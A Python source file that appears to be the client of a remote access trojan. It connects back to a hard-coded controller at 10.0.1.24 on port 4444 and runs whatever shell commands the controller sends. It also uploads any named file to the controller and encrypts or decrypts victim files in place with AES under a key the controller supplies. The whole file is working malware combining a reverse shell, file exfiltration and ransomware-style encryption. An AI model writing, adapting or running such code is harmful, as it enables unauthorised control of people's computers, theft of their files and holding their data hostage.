import socket
import os
import subprocess
import sys
from cryptography import fernet
from cryptography.fernet import Fernet
from Crypto.Cipher import AES

SERVER_HOST = "10.0.1.24"
#SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
BUFFER_SIZE = 1024
SEPARATOR = "<sep>"

#key = Fernet.generate_key()
#fer = Fernet(key)

def crypt_file(file_path, k, isEncrypted) :
    
    cipher = AES.new(k, AES.MODE_EAX)
    if isEncrypted == False:
        # Read file
        with open(file_path, 'rb') as f:
            data = f.read()
        # Create the ciphertext
        ciphertext, tag = cipher.encrypt_and_digest(data)
        # Overwrite the file with the cipher text
        fo = open(file_path, "wb")
        [ fo.write(x) for x in (cipher.nonce, tag, ciphertext) ]
        fo.close()
    else:
        # Decrypt
        fi = open(file_path, "rb")
        nonce, tag, ciphertext = [ fi.read(x) for x in (16, 16, -1) ]
        fi.close()
        cipher = AES.new(k, AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)
        with open(file_path, "wb") as fo:
            fo.write(data)

    
#with open(file_path, 'wb') as fp:
#    fp.write(_data)

"""
def encrypt_file(file_path) :
    
    with open(file_path, 'rb') as f:
        data = f.read()
        _data = fer.encrypt(data)
        print(_data)
    
    with open(file_path, 'wb') as fp:
        fp.write(_data)
    

def decrypt_file(file_path) :
    with open(file_path, 'rb') as f:
        data = f.read()
        _data = fer.decrypt(data)
        print(_data)
    
    with open(file_path, 'wb') as fp:
        fp.write(_data)
"""
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splitted_command = command.split()
    #print(command)

    if command.lower() == "exit":
        break
    if splitted_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splitted_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    elif splitted_command[0].lower() == 'read':
        file_name = splitted_command[1]
        
        try:
            file_size = os.path.getsize(file_name)
        
            s.send(str(file_size).encode())
            
            #print("Sending file...")
            content = open(file_name, "rb")

            some_data = content.read(BUFFER_SIZE)
            while some_data :
                s.send(some_data)
                some_data = content.read(BUFFER_SIZE)
            content.close()

            s.recv(BUFFER_SIZE)
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    elif splitted_command[0].lower() == "encrypt":
        file_name = splitted_command[1]
        s.send("1".encode())
        key = s.recv(BUFFER_SIZE)
        crypt_file(file_name, key, False)
        #s.send(key)
        s.recv(BUFFER_SIZE)
        output = ""
    elif splitted_command[0].lower() == "decrypt":
        file_name = splitted_command[1]
        s.send("1".encode())
        key = s.recv(BUFFER_SIZE)
        crypt_file(file_name, key, True) #is encrypted, want to decrypt
        s.recv(BUFFER_SIZE)
        #decrypt_file(file_name)
        #s.send(key)
        #s.recv(BUFFER_SIZE)
        output = ""
    else:
        output = subprocess.getoutput(command)
    #print(s.)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

s.close()